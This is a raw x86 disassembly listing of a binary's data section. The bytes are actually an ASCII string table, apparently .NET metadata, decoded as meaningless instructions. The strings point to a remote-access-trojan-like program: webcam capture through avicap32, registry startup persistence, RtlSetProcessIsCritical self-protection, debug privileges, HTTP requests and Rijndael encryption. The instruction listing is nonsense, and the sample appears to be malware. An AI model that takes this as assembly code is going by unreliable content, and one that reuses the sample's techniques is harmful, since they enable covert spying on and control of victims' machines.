  409576:	73 74                	jae    0x4095ec
  409578:	65 6d                	gs insl (%dx),%es:(%edi)
  40957a:	2e 4c                	cs dec %esp
  40957c:	69 6e 71 00 45 6e 75 	imul   $0x756e4500,0x71(%esi),%ebp
  409583:	6d                   	insl   (%dx),%es:(%edi)
  409584:	65 72 61             	gs jb  0x4095e8
  409587:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40958b:	49                   	dec    %ecx
  40958c:	45                   	inc    %ebp
  40958d:	6e                   	outsb  %ds:(%esi),(%dx)
  40958e:	75 6d                	jne    0x4095fd
  409590:	65 72 61             	gs jb  0x4095f4
  409593:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  409597:	31 00                	xor    %eax,(%eax)
  409599:	41                   	inc    %ecx
  40959a:	6e                   	outsb  %ds:(%esi),(%dx)
  40959b:	79 00                	jns    0x40959d
  40959d:	48                   	dec    %eax
  40959e:	74 74                	je     0x409614
  4095a0:	70 57                	jo     0x4095f9
  4095a2:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  4095a6:	71 75                	jno    0x40961d
  4095a8:	65 73 74             	gs jae 0x40961f
  4095ab:	00 48 74             	add    %cl,0x74(%eax)
  4095ae:	74 70                	je     0x409620
  4095b0:	57                   	push   %edi
  4095b1:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  4095b5:	73 70                	jae    0x409627
  4095b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4095b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b9:	73 65                	jae    0x409620
  4095bb:	00 57 65             	add    %dl,0x65(%edi)
  4095be:	62 52 65             	bound  %edx,0x65(%edx)
  4095c1:	71 75                	jno    0x409638
  4095c3:	65 73 74             	gs jae 0x40963a
  4095c6:	00 43 72             	add    %al,0x72(%ebx)
  4095c9:	65 61                	gs popa
  4095cb:	74 65                	je     0x409632
  4095cd:	00 73 65             	add    %dh,0x65(%ebx)
  4095d0:	74 5f                	je     0x409631
  4095d2:	55                   	push   %ebp
  4095d3:	73 65                	jae    0x40963a
  4095d5:	72 41                	jb     0x409618
  4095d7:	67 65 6e             	outsb  %gs:(%si),(%dx)
  4095da:	74 00                	je     0x4095dc
  4095dc:	73 65                	jae    0x409643
  4095de:	74 5f                	je     0x40963f
  4095e0:	41                   	inc    %ecx
  4095e1:	6c                   	insb   (%dx),%es:(%edi)
  4095e2:	6c                   	insb   (%dx),%es:(%edi)
  4095e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e4:	77 41                	ja     0x409627
  4095e6:	75 74                	jne    0x40965c
  4095e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e9:	52                   	push   %edx
  4095ea:	65 64 69 72 65 63 74 	gs imul $0x73007463,%fs:0x65(%edx),%esi
  4095f1:	00 73 
  4095f3:	65 74 5f             	gs je  0x409655
  4095f6:	54                   	push   %esp
  4095f7:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  4095fe:	73 65                	jae    0x409665
  409600:	74 5f                	je     0x409661
  409602:	4d                   	dec    %ebp
  409603:	65 74 68             	gs je  0x40966e
  409606:	6f                   	outsl  %ds:(%esi),(%dx)
  409607:	64 00 57 65          	add    %dl,%fs:0x65(%edi)
  40960b:	62 52 65             	bound  %edx,0x65(%edx)
  40960e:	73 70                	jae    0x409680
  409610:	6f                   	outsl  %ds:(%esi),(%dx)
  409611:	6e                   	outsb  %ds:(%esi),(%dx)
  409612:	73 65                	jae    0x409679
  409614:	00 47 65             	add    %al,0x65(%edi)
  409617:	74 52                	je     0x40966b
  409619:	65 73 70             	gs jae 0x40968c
  40961c:	6f                   	outsl  %ds:(%esi),(%dx)
  40961d:	6e                   	outsb  %ds:(%esi),(%dx)
  40961e:	73 65                	jae    0x409685
  409620:	00 53 70             	add    %dl,0x70(%ebx)
  409623:	61                   	popa
  409624:	63 65 00             	arpl   %esp,0x0(%ebp)
  409627:	45                   	inc    %ebp
  409628:	6e                   	outsb  %ds:(%esi),(%dx)
  409629:	64 73 57             	fs jae 0x409683
  40962c:	69 74 68 00 67 65 74 	imul   $0x5f746567,0x0(%eax,%ebp,2),%esi
  409633:	5f 
  409634:	45                   	inc    %ebp
  409635:	6e                   	outsb  %ds:(%esi),(%dx)
  409636:	74 72                	je     0x4096aa
  409638:	79 50                	jns    0x40968a
  40963a:	6f                   	outsl  %ds:(%esi),(%dx)
  40963b:	69 6e 74 00 4d 65 74 	imul   $0x74654d00,0x74(%esi),%ebp
  409642:	68 6f 64 42 61       	push   $0x6142646f
  409647:	73 65                	jae    0x4096ae
  409649:	00 50 61             	add    %dl,0x61(%eax)
  40964c:	72 61                	jb     0x4096af
  40964e:	6d                   	insl   (%dx),%es:(%edi)
  40964f:	65 74 65             	gs je  0x4096b7
  409652:	72 49                	jb     0x40969d
  409654:	6e                   	outsb  %ds:(%esi),(%dx)
  409655:	66 6f                	outsw  %ds:(%esi),(%dx)
  409657:	00 47 65             	add    %al,0x65(%edi)
  40965a:	74 50                	je     0x4096ac
  40965c:	61                   	popa
  40965d:	72 61                	jb     0x4096c0
  40965f:	6d                   	insl   (%dx),%es:(%edi)
  409660:	65 74 65             	gs je  0x4096c8
  409663:	72 73                	jb     0x4096d8
  409665:	00 45 6e             	add    %al,0x6e(%ebp)
  409668:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40966b:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  409672:	5f                   	pop    %edi
  409673:	55                   	push   %ebp
  409674:	54                   	push   %esp
  409675:	46                   	inc    %esi
  409676:	38 00                	cmp    %al,(%eax)
  409678:	47                   	inc    %edi
  409679:	65 74 42             	gs je  0x4096be
  40967c:	79 74                	jns    0x4096f2
  40967e:	65 73 00             	gs jae 0x409681
  409681:	61                   	popa
  409682:	76 69                	jbe    0x4096ed
  409684:	63 61 70             	arpl   %esp,0x70(%ecx)
  409687:	33 32                	xor    (%edx),%esi
  409689:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40968c:	6c                   	insb   (%dx),%es:(%edi)
  40968d:	00 4d 61             	add    %cl,0x61(%ebp)
  409690:	72 73                	jb     0x409705
  409692:	68 61 6c 41 73       	push   $0x73416c61
  409697:	41                   	inc    %ecx
  409698:	74 74                	je     0x40970e
  40969a:	72 69                	jb     0x409705
  40969c:	62 75 74             	bound  %esi,0x74(%ebp)
  40969f:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  4096a3:	6d                   	insl   (%dx),%es:(%edi)
  4096a4:	61                   	popa
  4096a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4096a6:	61                   	popa
  4096a7:	67 65 64 54          	addr16 gs fs push %esp
  4096ab:	79 70                	jns    0x40971d
  4096ad:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4096b1:	72 65                	jb     0x409718
  4096b3:	61                   	popa
  4096b4:	6d                   	insl   (%dx),%es:(%edi)
  4096b5:	57                   	push   %edi
  4096b6:	72 69                	jb     0x409721
  4096b8:	74 65                	je     0x40971f
  4096ba:	72 00                	jb     0x4096bc
  4096bc:	52                   	push   %edx
  4096bd:	65 67 69 73 74 72 79 	imul   $0x43007972,%gs:0x74(%bp,%di),%esi
  4096c4:	00 43 
  4096c6:	75 72                	jne    0x40973a
  4096c8:	72 65                	jb     0x40972f
  4096ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4096cb:	74 55                	je     0x409722
  4096cd:	73 65                	jae    0x409734
  4096cf:	72 00                	jb     0x4096d1
  4096d1:	44                   	inc    %esp
  4096d2:	65 6c                	gs insb (%dx),%es:(%edi)
  4096d4:	65 74 65             	gs je  0x40973c
  4096d7:	56                   	push   %esi
  4096d8:	61                   	popa
  4096d9:	6c                   	insb   (%dx),%es:(%edi)
  4096da:	75 65                	jne    0x409741
  4096dc:	00 73 65             	add    %dh,0x65(%ebx)
  4096df:	74 5f                	je     0x409740
  4096e1:	43                   	inc    %ebx
  4096e2:	72 65                	jb     0x409749
  4096e4:	61                   	popa
  4096e5:	74 65                	je     0x40974c
  4096e7:	4e                   	dec    %esi
  4096e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4096e9:	57                   	push   %edi
  4096ea:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  4096f1:	65 74 54             	gs je  0x409748
  4096f4:	65 6d                	gs insl (%dx),%es:(%edi)
  4096f6:	70 46                	jo     0x40973e
  4096f8:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4096ff:	00 
  409700:	54                   	push   %esp
  409701:	65 78 74             	gs js  0x409778
  409704:	57                   	push   %edi
  409705:	72 69                	jb     0x409770
  409707:	74 65                	je     0x40976e
  409709:	72 00                	jb     0x40970b
  40970b:	57                   	push   %edi
  40970c:	72 69                	jb     0x409777
  40970e:	74 65                	je     0x409775
  409710:	4c                   	dec    %esp
  409711:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  409718:	5f                   	pop    %edi
  409719:	53                   	push   %ebx
  40971a:	74 61                	je     0x40977d
  40971c:	72 74                	jb     0x409792
  40971e:	75 70                	jne    0x409790
  409720:	50                   	push   %eax
  409721:	61                   	popa
  409722:	74 68                	je     0x40978c
  409724:	00 67 65             	add    %ah,0x65(%edi)
  409727:	74 5f                	je     0x409788
  409729:	45                   	inc    %ebp
  40972a:	78 65                	js     0x409791
  40972c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40972f:	61                   	popa
  409730:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  409734:	61                   	popa
  409735:	74 68                	je     0x40979f
  409737:	00 73 65             	add    %dh,0x65(%ebx)
  40973a:	74 5f                	je     0x40979b
  40973c:	45                   	inc    %ebp
  40973d:	72 72                	jb     0x4097b1
  40973f:	6f                   	outsl  %ds:(%esi),(%dx)
  409740:	72 44                	jb     0x409786
  409742:	69 61 6c 6f 67 00 73 	imul   $0x7300676f,0x6c(%ecx),%esp
  409749:	65 74 5f             	gs je  0x4097ab
  40974c:	55                   	push   %ebp
  40974d:	73 65                	jae    0x4097b4
  40974f:	53                   	push   %ebx
  409750:	68 65 6c 6c 45       	push   $0x456c6c65
  409755:	78 65                	js     0x4097bc
  409757:	63 75 74             	arpl   %esi,0x74(%ebp)
  40975a:	65 00 5a 65          	add    %bl,%gs:0x65(%edx)
  40975e:	72 6f                	jb     0x4097cf
  409760:	00 52 75             	add    %dl,0x75(%edx)
  409763:	6e                   	outsb  %ds:(%esi),(%dx)
  409764:	00 67 65             	add    %ah,0x65(%edi)
  409767:	74 5f                	je     0x4097c8
  409769:	50                   	push   %eax
  40976a:	72 6f                	jb     0x4097db
  40976c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40976f:	73 4e                	jae    0x4097bf
  409771:	61                   	popa
  409772:	6d                   	insl   (%dx),%es:(%edi)
  409773:	65 00 6f 70          	add    %ch,%gs:0x70(%edi)
  409777:	5f                   	pop    %edi
  409778:	45                   	inc    %ebp
  409779:	78 70                	js     0x4097eb
  40977b:	6c                   	insb   (%dx),%es:(%edi)
  40977c:	69 63 69 74 00 6f 70 	imul   $0x706f0074,0x69(%ebx),%esp
  409783:	5f                   	pop    %edi
  409784:	45                   	inc    %ebp
  409785:	71 75                	jno    0x4097fc
  409787:	61                   	popa
  409788:	6c                   	insb   (%dx),%es:(%edi)
  409789:	69 74 79 00 4d 61 72 	imul   $0x7372614d,0x0(%ecx,%edi,2),%esi
  409790:	73 
  409791:	68 61 6c 00 52       	push   $0x52006c61
  409796:	65 61                	gs popa
  409798:	64 49                	fs dec %ecx
  40979a:	6e                   	outsb  %ds:(%esi),(%dx)
  40979b:	74 33                	je     0x4097d0
  40979d:	32 00                	xor    (%eax),%al
  40979f:	54                   	push   %esp
  4097a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4097a1:	55                   	push   %ebp
  4097a2:	49                   	dec    %ecx
  4097a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4097a4:	74 65                	je     0x40980b
  4097a6:	67 65 72 00          	addr16 gs jb 0x4097aa
  4097aa:	4b                   	dec    %ebx
  4097ab:	65 79 73             	gs jns 0x409821
  4097ae:	00 67 65             	add    %ah,0x65(%edi)
  4097b1:	74 5f                	je     0x409812
  4097b3:	4e                   	dec    %esi
  4097b4:	65 77 4c             	gs ja  0x409803
  4097b7:	69 6e 65 00 55 49 6e 	imul   $0x6e495500,0x65(%esi),%ebp
  4097be:	74 33                	je     0x4097f3
  4097c0:	32 00                	xor    (%eax),%al
  4097c2:	47                   	inc    %edi
  4097c3:	65 74 50             	gs je  0x409816
  4097c6:	72 6f                	jb     0x409837
  4097c8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4097cb:	73 42                	jae    0x40980f
  4097cd:	79 49                	jns    0x409818
  4097cf:	64 00 49 73          	add    %cl,%fs:0x73(%ecx)
  4097d3:	4e                   	dec    %esi
  4097d4:	75 6c                	jne    0x409842
  4097d6:	6c                   	insb   (%dx),%es:(%edi)
  4097d7:	4f                   	dec    %edi
  4097d8:	72 57                	jb     0x409831
  4097da:	68 69 74 65 53       	push   $0x53657469
  4097df:	70 61                	jo     0x409842
  4097e1:	63 65 00             	arpl   %esp,0x0(%ebp)
  4097e4:	75 73                	jne    0x409859
  4097e6:	65 72 33             	gs jb  0x40981c
  4097e9:	32 2e                	xor    (%esi),%ch
  4097eb:	64 6c                	fs insb (%dx),%es:(%edi)
  4097ed:	6c                   	insb   (%dx),%es:(%edi)
  4097ee:	00 4f 75             	add    %cl,0x75(%edi)
  4097f1:	74 41                	je     0x409834
  4097f3:	74 74                	je     0x409869
  4097f5:	72 69                	jb     0x409860
  4097f7:	62 75 74             	bound  %esi,0x74(%ebp)
  4097fa:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  4097fe:	73 73                	jae    0x409873
  409800:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409807:	6e                   	outsb  %ds:(%esi),(%dx)
  409808:	67 45                	addr16 inc %ebp
  40980a:	76 65                	jbe    0x409871
  40980c:	6e                   	outsb  %ds:(%esi),(%dx)
  40980d:	74 48                	je     0x409857
  40980f:	61                   	popa
  409810:	6e                   	outsb  %ds:(%esi),(%dx)
  409811:	64 6c                	fs insb (%dx),%es:(%edi)
  409813:	65 72 00             	gs jb  0x409816
  409816:	53                   	push   %ebx
  409817:	79 73                	jns    0x40988c
  409819:	74 65                	je     0x409880
  40981b:	6d                   	insl   (%dx),%es:(%edi)
  40981c:	45                   	inc    %ebp
  40981d:	76 65                	jbe    0x409884
  40981f:	6e                   	outsb  %ds:(%esi),(%dx)
  409820:	74 73                	je     0x409895
  409822:	00 61 64             	add    %ah,0x64(%ecx)
  409825:	64 5f                	fs pop %edi
  409827:	53                   	push   %ebx
  409828:	65 73 73             	gs jae 0x40989e
  40982b:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409832:	6e                   	outsb  %ds:(%esi),(%dx)
  409833:	67 00 45 6e          	add    %al,0x6e(%di)
  409837:	74 65                	je     0x40989e
  409839:	72 44                	jb     0x40987f
  40983b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40983f:	4d                   	dec    %ebp
  409840:	6f                   	outsl  %ds:(%esi),(%dx)
  409841:	64 65 00 4e 54       	fs add %cl,%gs:0x54(%esi)
  409846:	64 6c                	fs insb (%dx),%es:(%edi)
  409848:	6c                   	insb   (%dx),%es:(%edi)
  409849:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40984c:	6c                   	insb   (%dx),%es:(%edi)
  40984d:	00 52 74             	add    %dl,0x74(%edx)
  409850:	6c                   	insb   (%dx),%es:(%edi)
  409851:	53                   	push   %ebx
  409852:	65 74 50             	gs je  0x4098a5
  409855:	72 6f                	jb     0x4098c6
  409857:	63 65 73             	arpl   %esp,0x73(%ebp)
  40985a:	73 49                	jae    0x4098a5
  40985c:	73 43                	jae    0x4098a1
  40985e:	72 69                	jb     0x4098c9
  409860:	74 69                	je     0x4098cb
  409862:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409865:	00 53 79             	add    %dl,0x79(%ebx)
  409868:	73 74                	jae    0x4098de
  40986a:	65 6d                	gs insl (%dx),%es:(%edi)
  40986c:	2e 53                	cs push %ebx
  40986e:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409872:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409879:	70 
  40987a:	74 6f                	je     0x4098eb
  40987c:	67 72 61             	addr16 jb 0x4098e0
  40987f:	70 68                	jo     0x4098e9
  409881:	79 00                	jns    0x409883
  409883:	52                   	push   %edx
  409884:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  40988b:	4d                   	dec    %ebp
  40988c:	61                   	popa
  40988d:	6e                   	outsb  %ds:(%esi),(%dx)
  40988e:	61                   	popa
  40988f:	67 65 64 00 49 43    	gs add %cl,%fs:0x43(%bx,%di)
  409895:	72 79                	jb     0x409910
  409897:	70 74                	jo     0x40990d
  409899:	6f                   	outsl  %ds:(%esi),(%dx)
  40989a:	54                   	push   %esp
  40989b:	72 61                	jb     0x4098fe
  40989d:	6e                   	outsb  %ds:(%esi),(%dx)
  40989e:	73 66                	jae    0x409906
  4098a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098a1:	72 6d                	jb     0x409910
  4098a3:	00 4d 44             	add    %cl,0x44(%ebp)
  4098a6:	35 43 72 79 70       	xor    $0x70797243,%eax
  4098ab:	74 6f                	je     0x40991c
  4098ad:	53                   	push   %ebx
  4098ae:	65 72 76             	gs jb  0x409927
  4098b1:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4098b8:	69 64 65 72 00 48 61 	imul   $0x73614800,0x72(%ebp,%eiz,2),%esp
  4098bf:	73 
  4098c0:	68 41 6c 67 6f       	push   $0x6f676c41
  4098c5:	72 69                	jb     0x409930
  4098c7:	74 68                	je     0x409931
  4098c9:	6d                   	insl   (%dx),%es:(%edi)
  4098ca:	00 43 6f             	add    %al,0x6f(%ebx)
  4098cd:	6d                   	insl   (%dx),%es:(%edi)
  4098ce:	70 75                	jo     0x409945
  4098d0:	74 65                	je     0x409937
  4098d2:	48                   	dec    %eax
  4098d3:	61                   	popa
  4098d4:	73 68                	jae    0x40993e
  4098d6:	00 41 72             	add    %al,0x72(%ecx)
  4098d9:	72 61                	jb     0x40993c
  4098db:	79 00                	jns    0x4098dd
  4098dd:	43                   	inc    %ebx
  4098de:	6f                   	outsl  %ds:(%esi),(%dx)
  4098df:	70 79                	jo     0x40995a
  4098e1:	00 53 79             	add    %dl,0x79(%ebx)
  4098e4:	6d                   	insl   (%dx),%es:(%edi)
  4098e5:	6d                   	insl   (%dx),%es:(%edi)
  4098e6:	65 74 72             	gs je  0x40995b
  4098e9:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4098f0:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  4098f7:	74 
  4098f8:	5f                   	pop    %edi
  4098f9:	4b                   	dec    %ebx
  4098fa:	65 79 00             	gs jns 0x4098fd
  4098fd:	43                   	inc    %ebx
  4098fe:	69 70 68 65 72 4d 6f 	imul   $0x6f4d7265,0x68(%eax),%esi
  409905:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  40990a:	74 5f                	je     0x40996b
  40990c:	4d                   	dec    %ebp
  40990d:	6f                   	outsl  %ds:(%esi),(%dx)
  40990e:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  409913:	65 61                	gs popa
  409915:	74 65                	je     0x40997c
  409917:	44                   	inc    %esp
  409918:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40991c:	70 74                	jo     0x409992
  40991e:	6f                   	outsl  %ds:(%esi),(%dx)
  40991f:	72 00                	jb     0x409921
  409921:	54                   	push   %esp
  409922:	72 61                	jb     0x409985
  409924:	6e                   	outsb  %ds:(%esi),(%dx)
  409925:	73 66                	jae    0x40998d
  409927:	6f                   	outsl  %ds:(%esi),(%dx)
  409928:	72 6d                	jb     0x409997
  40992a:	46                   	inc    %esi
  40992b:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  409932:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  409935:	67 65 74 5f          	addr16 gs je 0x409998
  409939:	46                   	inc    %esi
  40993a:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409941:	00 
  409942:	55                   	push   %ebp
  409943:	72 69                	jb     0x4099ae
  409945:	00 55 72             	add    %dl,0x72(%ebp)
  409948:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  40994f:	6d                   	insl   (%dx),%es:(%edi)
  409950:	65 54                	gs push %esp
  409952:	79 70                	jns    0x4099c4
  409954:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  409958:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  40995c:	6f                   	outsl  %ds:(%esi),(%dx)
  40995d:	73 74                	jae    0x4099d3
  40995f:	4e                   	dec    %esi
  409960:	61                   	popa
  409961:	6d                   	insl   (%dx),%es:(%edi)
  409962:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409966:	74 5f                	je     0x4099c7
  409968:	43                   	inc    %ebx
  409969:	68 61 72 73 00       	push   $0x737261
  40996e:	53                   	push   %ebx
  40996f:	69 7a 65 4f 66 00 67 	imul   $0x6700664f,0x65(%edx),%edi
  409976:	65 74 5f             	gs je  0x4099d8
  409979:	54                   	push   %esp
  40997a:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  409981:	74 00                	je     0x409983
  409983:	47                   	inc    %edi
  409984:	65 74 53             	gs je  0x4099da
  409987:	74 72                	je     0x4099fb
  409989:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  409990:	5f                   	pop    %edi
  409991:	50                   	push   %eax
  409992:	72 6f                	jb     0x409a03
  409994:	63 65 73             	arpl   %esp,0x73(%ebp)
  409997:	73 6f                	jae    0x409a08
  409999:	72 43                	jb     0x4099de
  40999b:	6f                   	outsl  %ds:(%esi),(%dx)
  40999c:	75 6e                	jne    0x409a0c
  40999e:	74 00                	je     0x4099a0
  4099a0:	67 65 74 5f          	addr16 gs je 0x409a03
  4099a4:	53                   	push   %ebx
  4099a5:	79 73                	jns    0x409a1a
  4099a7:	74 65                	je     0x409a0e
  4099a9:	6d                   	insl   (%dx),%es:(%edi)
  4099aa:	44                   	inc    %esp
  4099ab:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4099b2:	79 00                	jns    0x4099b4
  4099b4:	47                   	inc    %edi
  4099b5:	65 74 50             	gs je  0x409a08
  4099b8:	61                   	popa
  4099b9:	74 68                	je     0x409a23
  4099bb:	52                   	push   %edx
  4099bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4099bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4099be:	74 00                	je     0x4099c0
  4099c0:	44                   	inc    %esp
  4099c1:	72 69                	jb     0x409a2c
  4099c3:	76 65                	jbe    0x409a2a
  4099c5:	49                   	dec    %ecx
  4099c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4099c7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4099c9:	00 67 65             	add    %ah,0x65(%edi)
  4099cc:	74 5f                	je     0x409a2d
  4099ce:	54                   	push   %esp
  4099cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4099d0:	74 61                	je     0x409a33
  4099d2:	6c                   	insb   (%dx),%es:(%edi)
  4099d3:	53                   	push   %ebx
  4099d4:	69 7a 65 00 49 6e 74 	imul   $0x746e4900,0x65(%edx),%edi
  4099db:	36 34 00             	ss xor $0x0,%al
  4099de:	67 65 74 5f          	addr16 gs je 0x409a41
  4099e2:	41                   	inc    %ecx
  4099e3:	53                   	push   %ebx
  4099e4:	43                   	inc    %ebx
  4099e5:	49                   	dec    %ecx
  4099e6:	49                   	dec    %ecx
  4099e7:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  4099eb:	70 70                	jo     0x409a5d
  4099ed:	65 72 00             	gs jb  0x4099f0
  4099f0:	52                   	push   %edx
  4099f1:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4099f8:	4b 65 
  4099fa:	79 50                	jns    0x409a4c
  4099fc:	65 72 6d             	gs jb  0x409a6c
  4099ff:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  409a06:	68 65 63 6b 00       	push   $0x6b6365
  409a0b:	43                   	inc    %ebx
  409a0c:	72 65                	jb     0x409a73
  409a0e:	61                   	popa
  409a0f:	74 65                	je     0x409a76
  409a11:	53                   	push   %ebx
  409a12:	75 62                	jne    0x409a76
  409a14:	4b                   	dec    %ebx
  409a15:	65 79 00             	gs jns 0x409a18
  409a18:	52                   	push   %edx
  409a19:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%bp,%di),%esi
  409a20:	56 61 
  409a22:	6c                   	insb   (%dx),%es:(%edi)
  409a23:	75 65                	jne    0x409a8a
  409a25:	4b                   	dec    %ebx
  409a26:	69 6e 64 00 42 69 74 	imul   $0x74694200,0x64(%esi),%ebp
  409a2d:	43                   	inc    %ebx
  409a2e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a2f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a30:	76 65                	jbe    0x409a97
  409a32:	72 74                	jb     0x409aa8
  409a34:	65 72 00             	gs jb  0x409a37
  409a37:	53                   	push   %ebx
  409a38:	79 73                	jns    0x409aad
  409a3a:	74 65                	je     0x409aa1
  409a3c:	6d                   	insl   (%dx),%es:(%edi)
  409a3d:	2e 49                	cs dec %ecx
  409a3f:	4f                   	dec    %edi
  409a40:	2e 43                	cs inc %ebx
  409a42:	6f                   	outsl  %ds:(%esi),(%dx)
  409a43:	6d                   	insl   (%dx),%es:(%edi)
  409a44:	70 72                	jo     0x409ab8
  409a46:	65 73 73             	gs jae 0x409abc
  409a49:	69 6f 6e 00 47 5a 69 	imul   $0x695a4700,0x6e(%edi),%ebp
  409a50:	70 53                	jo     0x409aa5
  409a52:	74 72                	je     0x409ac6
  409a54:	65 61                	gs popa
  409a56:	6d                   	insl   (%dx),%es:(%edi)
  409a57:	00 43 6f             	add    %al,0x6f(%ebx)
  409a5a:	6d                   	insl   (%dx),%es:(%edi)
  409a5b:	70 72                	jo     0x409acf
  409a5d:	65 73 73             	gs jae 0x409ad3
  409a60:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  409a67:	00 53 75             	add    %dl,0x75(%ebx)
  409a6a:	62 74 72 61          	bound  %esi,0x61(%edx,%esi,2)
  409a6e:	63 74 4f 62          	arpl   %esi,0x62(%edi,%ecx,2)
  409a72:	6a 65                	push   $0x65
  409a74:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409a78:	72 65                	jb     0x409adf
  409a7a:	61                   	popa
  409a7b:	74 65                	je     0x409ae2
  409a7d:	45                   	inc    %ebp
  409a7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7f:	63 72 79             	arpl   %esi,0x79(%edx)
  409a82:	70 74                	jo     0x409af8
  409a84:	6f                   	outsl  %ds:(%esi),(%dx)
  409a85:	72 00                	jb     0x409a87
  409a87:	53                   	push   %ebx
  409a88:	48                   	dec    %eax
  409a89:	43                   	inc    %ebx
  409a8a:	6f                   	outsl  %ds:(%esi),(%dx)
  409a8b:	72 65                	jb     0x409af2
  409a8d:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409a90:	6c                   	insb   (%dx),%es:(%edi)
  409a91:	00 53 74             	add    %dl,0x74(%ebx)
  409a94:	72 75                	jb     0x409b0b
  409a96:	63 74 4c 61          	arpl   %esi,0x61(%esp,%ecx,2)
  409a9a:	79 6f                	jns    0x409b0b
  409a9c:	75 74                	jne    0x409b12
  409a9e:	41                   	inc    %ecx
  409a9f:	74 74                	je     0x409b15
  409aa1:	72 69                	jb     0x409b0c
  409aa3:	62 75 74             	bound  %esi,0x74(%ebp)
  409aa6:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  409aab:	6f                   	outsl  %ds:(%esi),(%dx)
  409aac:	75 74                	jne    0x409b22
  409aae:	4b                   	dec    %ebx
  409aaf:	69 6e 64 00 43 6f 6d 	imul   $0x6d6f4300,0x64(%esi),%ebp
  409ab6:	70 69                	jo     0x409b21
  409ab8:	6c                   	insb   (%dx),%es:(%edi)
  409ab9:	61                   	popa
  409aba:	74 69                	je     0x409b25
  409abc:	6f                   	outsl  %ds:(%esi),(%dx)
  409abd:	6e                   	outsb  %ds:(%esi),(%dx)
  409abe:	52                   	push   %edx
  409abf:	65 6c                	gs insb (%dx),%es:(%edi)
  409ac1:	61                   	popa
  409ac2:	78 61                	js     0x409b25
  409ac4:	74 69                	je     0x409b2f
  409ac6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ac7:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac8:	73 41                	jae    0x409b0b
  409aca:	74 74                	je     0x409b40
  409acc:	72 69                	jb     0x409b37
  409ace:	62 75 74             	bound  %esi,0x74(%ebp)
  409ad1:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  409ad5:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad6:	74 69                	je     0x409b41
